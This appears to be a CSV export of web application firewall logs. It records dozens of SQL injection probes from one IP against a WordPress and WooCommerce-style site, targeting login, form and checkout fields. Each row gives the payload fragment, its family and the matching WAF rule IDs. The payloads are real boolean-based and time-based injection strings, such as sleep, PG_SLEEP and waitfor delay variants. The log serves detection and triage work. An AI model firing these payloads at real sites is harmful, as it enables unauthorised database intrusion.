timestamp_utc,txid,source_ip,host,user_agent,method,path,payload_location,parameter_or_scope,payload_family,normalised_fragment,waf_rule_ids,waf_detection,waf_action_evidence,response_status,duration_ms,signal_classification,scenario_outcome,evidence_boundary
2025-07-28T07:35:40+00:00,aIcoTJOj6ArwkI@hZpTL7wAAAAU,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,boolean_based_sqli,-1\x22 OR 5*5=25 or \x22kOcA7Ofp\x22=\x22,942100,Confirmed,Not observed,503,35.166,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:42+00:00,aIcoToX0Ax2570qybwMvxgAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,request_body,ARGS:s,other_sqli_pattern,Send Unlock EmailjUleogJC'; waitfor delay '0:0:15' --,942100;942240;942280,Confirmed,Not observed,503,31.098,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:47+00:00,aIcoUsDOPXPGzoA-Bw3ivAAAABU,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,"10'XOR(1*if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,301,568.997,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:47+00:00,aIcoU@oSvh-qBabVeNC1VQAAAAE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,time_based_sqli,1TJmdKB2k' OR 305=(SELECT 305 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,31.478,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:49+00:00,aIcoVIX0Ax2570qybwMvyQAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,boolean_based_sqli,-1 OR 5*5=25 --,942100,Confirmed,Not observed,301,549.277,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:49+00:00,aIcoVeG51lm900tyYR@cpAAAAAQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,boolean_based_sqli,-1 OR 5*5=25,942100,Confirmed,Not observed,301,568.442,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:50+00:00,aIcoVeLuXh@jHKXzDYVE3AAAABQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,boolean_based_sqli,-1' OR 5*5=25 --,942100,Confirmed,Not observed,301,537.381,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:50+00:00,aIcoVq1GardbAwlecNBfbgAAAAo,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,boolean_based_sqli,-1\x22 OR 5*5=25 --,942100,Confirmed,Not observed,301,549.270,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:51+00:00,aIcoVwa1cVAUMsmLfxbMpQAAABc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,boolean_based_sqli,-1' OR 5*5=25 or 'u67OWqY0'=',942100,Confirmed,Not observed,301,914.039,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:52+00:00,aIcoWJOj6ArwkI@hZpTL9AAAAAU,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,boolean_based_sqli,-1\x22 OR 5*5=25 or \x22ZuabEmFh\x22=\x22,942100,Confirmed,Not observed,301,557.539,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:53+00:00,aIcoWcDOPXPGzoA-Bw3iwAAAABU,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,"if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,503,29.873,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:54+00:00,aIcoWuJYeYlOjsiZ1TgYUgAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,argument_location_unresolved,ARGS:cart[b28554d34de6b772a2a8a32ea846c815][qty],time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,45.871,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:54+00:00,aIcoWkDEq92xi8Gc@6IDuQAAAAw,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,request_body,ARGS:s,time_based_sqli,Send Unlock Email4WvykFqu' OR 816=(SELECT 816 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,64.791,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:57+00:00,aIcoXYX0Ax2570qybwMvywAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_b2a07e48/d_dbe2fe6a,argument_location_unresolved,ARGS:quantity,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,31.640,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:58+00:00,aIcoXen8KDJCxJaElMC5DwAAABg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,"10\x22XOR(1*if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,301,519.311,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:58+00:00,aIcoXga1cVAUMsmLfxbMpwAAABc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,time_based_sqli,1M4qDf2vp') OR 752=(SELECT 752 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,29.774,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:35:59+00:00,aIcoX3VEZaWkfJOLXKSufQAAAAk,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:billing_phone,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,40.624,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:03+00:00,aIcoYkDEq92xi8Gc@6IDvAAAAAw,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,"1*if(now()=sysdate(),sleep(15),0)",942100;942160,Confirmed,Not observed,301,532.110,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:04+00:00,aIcoZEDEq92xi8Gc@6IDvQAAAAw,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,"https://df7754e.hu/wp-admin/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,503,48.260,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:06+00:00,aIcoZun8KDJCxJaElMC5EQAAABg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,request_body,ARGS:s,time_based_sqli,Send Unlock EmailFtE1l4Ty') OR 279=(SELECT 279 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,62.204,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:11+00:00,aIcoa61GardbAwlecNBfdwAAAAo,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,31.681,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:11+00:00,aIcoa-2Ra4xSM@qngKlibgAAAAQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,time_based_sqli,1ZGHDJ5Xn')) OR 443=(SELECT 443 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,31.230,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:13+00:00,aIcobYX0Ax2570qybwMvzwAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:billing_email,concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,39.696,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:16+00:00,aIcocIX0Ax2570qybwMv0AAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,"10'XOR(1*if(now()=sysdate(),sleep(15),0))XOR'Z",942100;942160,Confirmed,Not observed,301,570.139,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:18+00:00,aIcocga1cVAUMsmLfxbMrAAAABc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,"https://df7754e.hu/wp-admin/0\x22XOR(if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,503,32.200,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:20+00:00,aIcodIAqjnhrTPWA@bql8wAAABM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/,request_body,ARGS:keyword,concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,32.365,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:20+00:00,aIcodDM7Fd2@c4X6fzj9-AAAABA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,request_body,ARGS:s,time_based_sqli,Send Unlock EmailBvueErT6')) OR 713=(SELECT 713 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,78.696,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:24+00:00,aIcod7bHKQA1A3YXWDrYRQAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,other_sqli_pattern,1-1; waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,533.417,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:24+00:00,aIcoeIX0Ax2570qybwMv0gAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,libinjection_only,1*DBMS_PIPE.RECEIVE_MESSAGE(CHR(99),942100,Confirmed,Not observed,503,31.328,needs_manual_review,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:30+00:00,aIcofcgrJV9JTtLt75-bmgAAAAQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,"10\x22XOR(1*if(now()=sysdate(),sleep(15),0))XOR\x22Z",942100;942160,Confirmed,Not observed,301,544.040,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:31+00:00,aIcof4urV9ELpbGtwuWD-wAAAAo,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,35.651,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:34+00:00,aIcogsgrJV9JTtLt75-bnAAAAAQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,request_body,ARGS:s,libinjection_only,Send Unlock Email',942100,Confirmed,Not observed,503,30.970,needs_manual_review,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:34+00:00,aIcogourV9ELpbGtwuWEAAAAAAo,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:billing_address_1,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,39.742,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:34+00:00,aIcogrbHKQA1A3YXWDrYUgAAAA8,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS,concatenated_or_function_sqli,(select 198766*667891),942100;942360,Confirmed,Not observed,503,30.793,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:34+00:00,aIcogoX0Ax2570qybwMv1gAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS,concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,503,30.310,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:37+00:00,aIcohYX0Ax2570qybwMv1wAAAAM,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,other_sqli_pattern,1-1); waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,570.294,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:37+00:00,aIcohWTJwhip9CDkhFW09QAAABE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,libinjection_only,1',942100,Confirmed,Not observed,503,31.572,needs_manual_review,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:37+00:00,aIcohXPi849S4bU556GCUgAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_43826a23,request_body,ARGS:cart[fd544202337cfd3429517881a3f1d0f4][qty],time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,44.719,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:38+00:00,aIcohrI@KgNexLzaDtNMMwAAABQ,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,concatenated_or_function_sqli,(select 198766*667891),942100;942360,Confirmed,Not observed,503,30.700,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:38+00:00,aIcohhv7la45rIg6LNvOlgAAAAk,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/wp-login.php,query_string,ARGS:reauth,concatenated_or_function_sqli,(select 198766*667891 from DUAL),942100;942360,Confirmed,Not observed,403,33.051,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:41+00:00,aIcoiXPi849S4bU556GCUwAAAAg,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,49.016,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:42+00:00,aIcoisdt4ZwsBg0vOS6T6gAAAA4,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,other_sqli_pattern,https://df7754e.hu/wp-admin/-1 waitfor delay '0:0:15' --,942280,Confirmed,Not observed,503,29.427,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:47+00:00,aIcoj2TJwhip9CDkhFW1AQAAABE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",POST,/d_c8655413,argument_location_unresolved,ARGS:billing_tax_number,time_based_sqli,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'\x22+(select(0)from(sel…,942100;942160;942360,Confirmed,Not observed,403,39.305,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:50+00:00,aIcoka-4q@9E42vuelVVegAAAAs,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,other_sqli_pattern,1-1 waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,527.926,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:52+00:00,aIcokwa1cVAUMsmLfxbMtgAAABc,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_93b59401/d_bdc548f5,unknown,,surrounding_activity,/d_93b59401/d_bdc548f5,,Not observed,Not observed,404,654.893,needs_manual_review,Not applicable,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:53+00:00,aIcolf1KiuCFXtNlI4ijKQAAAAE,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,other_sqli_pattern,1-1; waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,532.788,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:36:55+00:00,aIcol6-4q@9E42vuelVVfAAAAAs,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,other_sqli_pattern,https://df7754e.hu/wp-admin/v8zyXQAQ'; waitfor delay '0:0:15' --,942100;942240;942280,Confirmed,Not observed,503,29.523,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:37:04+00:00,aIcooKjCwQxNryl6Fak2SgAAAAI,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,other_sqli_pattern,1riglYoSh'; waitfor delay '0:0:15' --,942100;942240;942280,Confirmed,Not observed,301,536.427,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:37:07+00:00,aIcoo6LbQAiTO@qYGZ-1rgAAAAA,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,other_sqli_pattern,1-1); waitfor delay '0:0:15' --,942100;942280,Confirmed,Not observed,301,537.249,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:37:09+00:00,aIcopWpRLht6TLuRzSjDOAAAAA0,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/wp-login.php,query_string,ARGS:redirect_to,time_based_sqli,https://df7754e.hu/wp-admin/CmDj7p9I' OR 592=(SELECT 592 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,503,30.401,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
2025-07-28T07:37:18+00:00,aIcorajCwQxNryl6Fak2TgAAAAI,100.77.175.132,df7754e.hu,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",GET,/d_eac5f762/d_a0e62b38,query_string,ARGS:nf-field-hp,time_based_sqli,1-1 OR 429=(SELECT 429 FROM PG_SLEEP(15))--,942100;942160,Confirmed,Not observed,301,537.559,high_signal_sqli_attempt,Attempted,HTTP status is not treated as WAF block or exploit success evidence
